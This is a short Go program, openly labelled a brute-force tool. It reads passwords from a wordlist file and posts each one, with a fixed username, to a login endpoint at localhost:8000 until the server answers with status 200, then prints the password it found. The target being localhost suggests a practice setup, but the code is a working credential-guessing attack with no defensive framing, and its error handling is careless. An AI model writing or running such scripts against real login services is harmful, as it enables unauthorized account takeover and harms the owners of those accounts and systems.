package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func readPassword(path string) []string {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Println(err.Error())
	}
	nonSpace := strings.Split(string(data), "\n")

	return nonSpace
}

type OAuth struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

func postData(url string, username string, password string) bool {
	//jsonValue := map[string]string{"username": username, "password": password}
	jsonValue := OAuth{Password: password, Username: username}
	jsonM, mErr := json.Marshal(jsonValue)
	if mErr != nil {
		fmt.Println("Error: ", mErr.Error())
	}
	resp, pErr := http.Post(url, "application/json", bytes.NewBuffer(jsonM))
	if pErr != nil {
		fmt.Printf("Post error %s \n", pErr.Error())
	}

	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		fmt.Println("Status code: ", resp.Status)
		return true
	}

	return false
}

func main() {
	fmt.Println("Brut force start.... ")
	fileData := readPassword("pass.txt") // path to password file
	for _, password := range fileData {
		if postData("http://localhost:8000/login", "debil", password) {
			fmt.Println(password)
			break
		}
	}
}
